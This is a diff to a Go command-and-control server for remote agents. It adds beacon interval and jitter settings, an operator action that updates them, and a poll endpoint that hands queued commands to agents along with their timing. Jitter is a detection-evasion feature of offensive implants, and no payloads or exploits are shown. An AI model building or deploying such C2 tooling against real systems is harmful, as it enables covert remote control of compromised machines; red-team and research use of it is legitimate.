@@ -17,8 +17,11 @@ type AgentSession struct {
 	LastSeen    time.Time `json:"last_seen"`
 	TaskQueue   []string  `json:"task_queue"`   // agent task list
 	OutputQueue []string  `json:"output_queue"` // agent output list 
+	Interval     int             `json:"interval"` // polling
+    Jitter       int             `json:"jitter"`   // jitter
+
 }
-//map off al the agents
+
 var (
 	clients = make(map[string]*AgentSession)
 	mu      sync.Mutex
@@ -69,6 +72,7 @@ func handleEvents(c *gin.Context) {
 }
 
 
+
 func handleOperator(c *gin.Context) {
 	opts := &websocket.AcceptOptions{
 		InsecureSkipVerify: true,
@@ -117,7 +121,6 @@ func handleOperator(c *gin.Context) {
 			command := msg["data"].(string)
 
 			mu.Lock()
-			// Se l'agente non esiste, lo creiamo al volo
 			if _, exists := clients[agentID]; !exists {
 				clients[agentID] = &AgentSession{
 					ID:        agentID,
@@ -147,6 +150,22 @@ func handleOperator(c *gin.Context) {
 				"status": "success",
 				"agents": agentList,
 			})
+		} else if action == "update_beacon" {
+			agentID := msg["agent_id"].(string)
+			interval := int(msg["interval"].(float64))
+			jitter := int(msg["jitter"].(float64))
+
+			mu.Lock()
+			if session, exists := clients[agentID]; exists {
+				session.Interval = interval
+				session.Jitter = jitter
+			} else {
+				clients[agentID] = &AgentSession{ID: agentID, Interval: interval, Jitter: jitter}
+			}
+			mu.Unlock()
+
+			wsjson.Write(ctx, conn, map[string]string{"status": "success", "output": "Beacon updated."})
+
 		}
 	}
 }
@@ -168,43 +187,46 @@ func main() {
 
 	// GET /api/agent/poll?id=<agent id>
 	r.GET("/api/agent/poll", func(c *gin.Context) {
-		agentID := c.Query("id")
-		if agentID == "" {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "Missing agent ID"})
-			return
-		}
+        agentID := c.Query("id")
+        if agentID == "" {
+            c.JSON(http.StatusBadRequest, gin.H{"error": "Missing agent ID"})
+            return
+        }
 
-		mu.Lock()
-		defer mu.Unlock()
+        mu.Lock()
+        defer mu.Unlock()
 
-		session, exists := clients[agentID]
-		//automatinc session
-		if !exists {
-			clients[agentID] = &AgentSession{
-				ID:        agentID,
-				LastSeen:  time.Now(),
-				TaskQueue: []string{},
-			}
-			c.JSON(http.StatusOK, gin.H{"status": "no_tasks", "command": ""})
-			return
-		}
+        session, exists := clients[agentID]
+        if !exists {
+            clients[agentID] = &AgentSession{
+                ID:        agentID,
+                LastSeen:  time.Now(),
+                TaskQueue: []string{},
+                Interval:  5,
+                Jitter:    0,
+            }
+            session = clients[agentID]
+        }
 
-		session.LastSeen = time.Now()
+        session.LastSeen = time.Now()
 
-		if len(session.TaskQueue) == 0 {
-			c.JSON(http.StatusOK, gin.H{"status": "no_tasks", "command": ""})
-			return
-		}
+        status := "no_tasks"
+        command := ""
+        if len(session.TaskQueue) > 0 {
+            status = "task_assigned"
+            command = session.TaskQueue[0]
+            session.TaskQueue = session.TaskQueue[1:]
+        }
 
-		//fifo of the fist comand
-		command := session.TaskQueue[0]
-		session.TaskQueue = session.TaskQueue[1:]
+
 
 		c.JSON(http.StatusOK, gin.H{
-			"status":  "task_assigned",
-			"command": command,
+			"status":   status,
+			"command":  command,
+			"interval": session.Interval,
+			"jitter":   session.Jitter,
 		})
-	})
+    })
 
 
 
